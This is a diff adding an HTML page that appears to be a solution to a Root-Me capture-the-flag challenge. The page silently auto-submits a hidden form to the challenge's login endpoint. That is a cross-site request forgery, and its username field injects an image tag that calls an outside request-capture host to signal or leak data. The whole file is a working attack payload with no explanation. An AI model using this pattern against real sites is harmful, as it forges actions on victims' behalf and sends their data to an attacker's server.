@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Document</title>
+    </head>
+    <body>
+        <form
+            name="payload"
+            action="http://challenge01.root-me.org:58003/login"
+            method="post"
+        >
+            <input
+                type="text"
+                name="username"
+                value="<img src='https://en751j6eplzxc.x.pipedream.net/img.png'>"
+                hidden
+            />
+            <input type="text" name="secret" value="secsecsec" hidden />
+            <button type="submit">Click</button>
+        </form>
+    </body>
+    <script>
+        document.forms["payload"].submit();
+    </script>
+</html>
